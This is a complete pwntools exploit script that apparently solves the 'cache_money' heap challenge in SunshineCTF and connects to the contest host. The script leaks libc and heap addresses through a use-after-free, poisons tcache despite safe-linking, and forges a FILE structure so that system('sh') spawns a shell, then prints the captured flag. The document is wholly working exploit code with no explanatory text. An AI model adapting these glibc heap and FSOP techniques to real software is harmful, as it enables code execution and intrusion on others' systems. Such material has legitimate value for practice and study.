#!/usr/bin/env python3
from pwn import *

PORT = 26004
HOST = "chal.sunshinectf.games"
elf = context.binary = ELF('./cache_money_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x000000000040174C
            b* 0x000000000040187D
            b* 0x0000000000401959
            b* 0x0000000000401ACD
            b* 0x0000000000401D24
            b* 0x000000000040171C
            b* 0x0000000000401266
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'>>> ', str(opt).encode())

def open(name, sz):
    menu(1)
    sla(b'Wallet name: ', name)
    sla(b'(0x20 - 0x100): ', str(sz).encode())

def deposit(i, dt):
    menu(2)
    sla(b'wallet? (0-15): ', str(i).encode())
    sa(b'data: ', dt)

def withdraw(i):
    menu(3)
    sla(b'(0-15): ', str(i).encode())

def transfer(sr, ds):
    menu(4)
    sla(b'Transfer FROM which wallet? (0-15): ', str(sr).encode())
    sla(b'Transfer TO which wallet? (0-15): ', str(ds).encode())

def close(i):
    menu(5)
    sla(b'(0-15): ', str(i).encode())

# Leak libc
for i in range(9):
    open(f'{i}', 0x90)
    deposit(i, f'{i}')

for i in range(7):
    close(i)

transfer(7, 8)
# GDB()
withdraw(8)
p.recvuntil(b'bytes):\n    ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x203b20
log.info(f'libc: {hex(libc.address)}')

# Leak heap
open(b'dump', 0x20)
deposit(0, 'dump')
close(0)

open(b'B'*8, 0x20)
open(b'C'*8, 0x20)
open(b'D'*8, 0x20)
transfer(0, 1)
# GDB()
withdraw(1)
p.recvuntil(b'bytes):\n    ')
heap = (u64(p.recv(3).ljust(8, b'\x00')) - 1) << 12
log.info(f'heap: {hex(heap)}')

# FSOP

deposit(1, p64(0)+p64(0))
transfer(1, 2) # 1 -> 1

chunk3 = heap + 0x1b80
fsop = flat({
    0x0: b'  sh\x00\x00\x00\x00',
    0x20: 0,  # write_base
    0x28: 1,  # write_ptr
    0x68: libc.sym.system,  # wide_vtable[0x68]
    0x88: chunk3 + 0x200,  #_lock
    0xa0: chunk3,          # _wide_data
    0xd8: libc.sym._IO_wfile_jumps,  # vtable
    0xe0: chunk3           # wide_vtable
    }, filler = b'\x00')

open(b'fake file', 0xe8)
deposit(3, fsop)

chunk = heap + 0x1950

pl = (chunk>>12) ^ libc.sym._IO_list_all
deposit(2, p64(pl))

open(b'4', 0x20)
open(b'5', 0x20) # _IO_list_all

# GDB()
deposit(5, p64(chunk3))

menu(0)
p.interactive()

# sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}